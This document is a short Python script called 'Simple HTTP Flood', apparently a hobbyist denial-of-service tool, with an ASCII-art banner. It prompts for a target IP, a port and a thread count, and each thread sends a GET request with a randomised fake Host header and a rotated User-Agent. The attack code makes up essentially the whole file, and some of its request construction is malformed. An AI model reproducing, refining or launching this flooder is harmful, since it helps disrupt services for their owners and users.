import socket, threading, random, os

ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
logo = """
                                             
                                             
                                       .kMMM 
                                     JMMMMMk 
                                   DMMMMMMM  
                                 BMMMMMMMM   
                              .QMMMMMMMMM    
                             QMMMMMMMMMM     
                       :   ;MMQMMMMMMMM      
                     7MMMMMMS  MMMMMMW       
                   .MM, .DM     .JMMD        
                   MMB           BM:         
                     MMG       cMW           
                    QMi       :MS            
                  LMM          @M            
                 MM7       MO  iM1           
       .Bz     1MM       fMMM;QML            
      oMMMMMC,MM;      .MM, DMM              
    .MMMMMMMMM@       pM@    .               
   qMMMMMMMMMME     .MM:                     
  MMMMMMMMMMMMMq   nMm                       
   :GMMMMMMMMMMMMMMM                         
       iZ GMMMMMMMMM                         
     ;E7.  .MMMMMMMMM                        
   ,MMf      MMMMMMMMW                       
   MMM.   M EMMMMMMMMW                       
  pMMM.  Mp  MMMMMMM:                        
  QMMMkMM@   .MMMMD                          
  OMMMM@,     kMM.                           
               c                           
            Simple HTTP Flood
               By : MrSanZz
                               
"""
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')
print(logo)
ip = str(input("IP Target : "))
port = int(input("Port : "))
thread = int(input("Thread : "))
attack = int(0)
if os.name == "posix":
    os.system('clear')
elif os.name == "nt":
    os.system('cls')
print(logo)
def flood():
    ang = ['1','2','3','4','5','6','7','8','9','0']
    n1 = random.choice(ang)
    n2 = random.choice(ang)
    n3 = random.choice(ang)
    n4 = random.choice(ang)
    n5 = random.choice(ang)
    n6 = random.choice(ang)
    n7 = random.choice(ang)
    fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
    try:
        global attack
        attack += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        req = "GET " + str(ip) + " HTTP/1.1\r\n"
        req += "Host: " + str(fip) + "\r\n"
        req += "Proxt-agent: " + str(fip) + "\r\n"
        req += "User-Agent: " + random.choice(ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += "Connection: keep-alive\r\n"
        s.send(req.encode())
        s.close()
        print("Flooding..          ",attack,"Sent", end='\r')
    except socket.gaierror:
        print("[SocketG E]         ", end='\r')
        s.close()
    except ConnectionRefusedError:
        print("[Refused E]         ", end='\r')
        s.close()
    except TimeoutError:
        print("  TIMEOUT           ", end='\r')
        s.close()
for i in range(thread):
    t = threading.Thread(target=flood)
    t.start()